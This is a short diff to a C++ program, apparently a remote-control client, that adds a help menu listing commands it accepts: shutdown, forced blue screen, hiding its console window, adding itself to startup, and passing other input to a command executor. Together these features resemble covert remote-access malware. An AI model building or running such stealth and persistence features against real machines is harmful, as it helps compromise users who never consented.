@@ -130,6 +130,22 @@ int main() {
             {
 				output = "No command received.\n";
             }
+            else if (command == "help")
+            {
+				output = "Commands:\n";
+				output += "exit - Exit the program\n";
+				output += "shutdown - Shutdown the computer\n";
+				output += "logoff - Log off the current user\n";
+				output += "hibernate - Hibernate the computer\n";
+				output += "restart - Restart the computer\n";
+				output += "bsod - Blue screen of death\n";
+				output += "lock - Lock the computer\n";
+				output += "hide - Hide the console window\n";
+				output += "show - Show the console window\n";
+				output += "list - List all running processes\n";
+				output += "startup - Add the program to startup\n";
+				output += "uninstall - Uninstall the program\n";
+            }
             else {
                 output.clear();
                 execute_command(command, output);
